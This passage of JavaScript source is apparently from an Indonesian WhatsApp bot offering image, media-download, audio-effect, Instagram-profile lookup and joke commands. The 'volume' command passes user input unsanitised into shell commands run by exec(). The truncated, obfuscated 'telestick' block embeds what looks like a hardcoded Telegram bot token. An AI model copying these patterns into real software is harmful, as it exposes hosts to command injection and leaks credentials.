case 'animecringe':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
NFSStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await NFSBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
NFSStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await NFSBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcNFS("Masukkan emoji, maksimal 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
NFSStickWait()
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcNFS('Dimana emojinya?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await NFSBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Dibuat oleh ${global.botname}`}, {quoted:m})
await NFSBotInc.sendMessage(from, {text:"balas # pada gambar ini untuk membuat stiker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcNFS(`*Contoh :* ${prefix + command} 10`)
media = await NFSBotInc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcNFS('Error!')
jadie = fs.readFileSync(rname)
NFSBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcNFS('Error!')
jadie = fs.readFileSync(rname)
NFSBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcNFS("Kirim video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcNFS('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcNFS(body)
  } catch (e) {
  replygcNFS(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcNFS(`Di mana tautannya?\n*Contoh :*\n${prefix}${command} https://github.com/Blawuken/NFSMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcNFS(`Tautan tidak valid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    NFSBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcNFS(mess.error))
break
case "spotify":{
if (!isPrem) return replyprem(mess.premium)
if (!text) return replygcNFS(`Di mana tautannya?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcNFS(`Tautan yang Anda berikan bukan tautan spotify`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Judul:* ${name || ''}\n${themeemoji} *Artis:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Tanggal rilis:* ${release_date || ''}`
       const response = await NFSBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await NFSBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                NFSStickWait()
                let media = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcNFS(err)
                let buff = fs.readFileSync(ran)
                NFSBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcNFS(`Balas ke audio yang ingin Anda ubah dengan teks *${prefix + command}*`)
                } catch (e) {
                replygcNFS(e)
                }
                break
                case 'define': 
if (!q) return replygcNFS(`Apa yang ingin Anda definisikan?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcNFS(mess.error)
const reply = `
*${themeemoji} Kata:* ${q}
*${themeemoji} Definisi:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Contoh:* ${targetfine.data.list[0].contoh
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   NFSBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcNFS(`*${q}* bukan teks yang valid`)
    }
    break
                case 'can': case 'bisakah': {
            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} aku menari?`)
            	let bisa = [`Bisa`,`Tidak bisa`,`Mungkin`,`Tentu saja Anda bisa!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*${keh}`
            await replygcNFS(jawab)
            }
            break
            case 'is': case 'apakah': {
            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} dia perawan?`)
            	let apa = [`Ya`, `TIDAK`, `Bisa jadi`, `Itu benar`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `${kah}`                
            await replygcNFS(jawab)
            }
            break
            case 'when': case 'kapan': {
            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} apakah saya akan menikah?`)
            	let kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagis','3 Tahun Lagis','4 Tahun Lagis','5 Tahun Lagis','Besok','Lusa','Mben']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `${koh}`                
            await replygcNFS(jawab)
            }
            break
case 'what': case 'apa': {
            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} adalah namamu?`)
            	let lel = [`Tanya Nenekmu`, `Tanya Ibumu`, `Aku tidak tahu`, `Aku tidak tahu`, `Tanya Ayahmu`, `Nama kamu adalah *Yanto*`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `${kah}`                
            await replygcNFS(jawab)
            }
            break
case 'where': case 'dimana': {
if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} Tempat tinggalku?`)
            	let wherelol = [`Di Gunung`, `Di Mars`, `Di bulan`,`Di dalam hutan`,`Aku tidak tahu tanya ibumu`,`Itu bisa di suatu tempat`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `${kah}`              
            await replygcNFS(jawab)
            }
            break
case 'how': case 'bagaimana': {
            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} berkencan dengan gadis?`)
            	let gimana = [`Ummm...`, `Susahnya Bang`, `Maaf Bot Tidak Bisa Menjawab`, `Coba Cari Di Google`,`Astaga! Benar-benar???`,`Pusing Ah😴`, `tidak mau menjawab`,`Ohhh saya lihat🙂`,`Mboh`, `Jangan membuatku pusing😞`,`Benar-benar bung 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `${kah}`                
            await replygcNFS(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcNFS(`*Contoh :* ${prefix + command} Profil saya`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `${kah}%`                
            await replygcNFS(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*Bot Telah Aktif Sejak:*\n*${runtime(process.uptime())}*`
                replygcNFS(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck': case 'hotcheck': case 'smartcheck': case 'greatcheck': case 'evilcheck':case 'dogcheck': case 'coolcheck': case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const NFSkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
NFSBotInc.sendMessage(m.chat, { text: NFSkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return NFSStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
NFSBotInc.sendMessage(m.chat,
{ text: `👫Belahan Jiwa Anda Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./NFSMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return NFSStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
NFSBotInc.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieee, ada apa❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./NFSMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                NFSBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcNFS('Masukkan Judul Kueri')
                NFSStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul : ${result.title}\n${themeemoji} Kategori : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcNFS('Masukkan Judul Kueri')
                NFSStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul : ${result.title}\n${themeemoji} Sumber : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return NFSStickGroup()
            	if (!text) return replygcNFS(`Apa yang ingin Anda pilih?\n*Contoh :* ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await NFSBotInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let NFSshimts = member[Math.floor(Math.random() * member.length)]
             NFSBotInc.sendMessage(from, { 
text: `Yang paling *${text}* di sini adalah *@${NFSshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[NFSshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./NFSMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case "igvid": case "instavid": {
if (!text) return replygcNFS(`Di mana tautannya?\n\n*Contoh :* ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
NFSStickWait()
let resNFSyinsta = await NFSInstaMp4(text)
const gha1 = await NFSBotInc.sendMessage(m.chat,{video:{url: resNFSyinsta.url[0].url},caption: mess.success},{quoted:m})
}
break
case 'igstalk': {
if (!args[0]) return replygcNFS(`Masukkan Nama Pengguna Instagram\n\n*Contoh :* ${prefix + command} anggit0817`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *MENGUNTIT* 
▢ *🔖Nama:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Pengikut:* ${res.followersH}
▢ *👣Mengikuti:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await NFSBotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        replygcNFS(`Pastikan nama pengguna berasal dari *Instagram*`)
      }
}
break
           case "igimg": case "instaimg":  {
if (!text) return replygcNFS(`Di mana tautannya?\n\n*Contoh :* ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
NFSStickWait()
const risponsNFS = await NFSIgImg(text)
for (let i=0;i<risponsNFS.length;i++) {
let ghd = await NFSBotInc.sendFileUrl(m.chat, risponsNFS[i], `Ini dia!`, m)
}
}
break 
case "fbvid": case "facebookvid":{
if (!text) return replygcNFS(`Dimana urlnya?\n\n*Contoh :* ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
NFSStickWait()
let res = await NFSFb(q)
let ghdp = await NFSBotInc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
case "twittervid":case "twitvid":{
if (!text) return replygcNFS(`Dimana urlnya?\n\n*Contoh :* ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
NFSStickWait()
let res = await NFSTwitter(q)
let ghdx = await NFSBotInc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
    case 'tts': case 'gtts':{
if (!text) return replygcNFS('Dimana teksnya?')
            let texttts = text
            const NFSrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return NFSBotInc.sendMessage(m.chat, {
                audio: {
                    url: NFSrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case 'telestick': { //credit agan
        	if (m.isGroup) return NFSStickPrivate()
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const 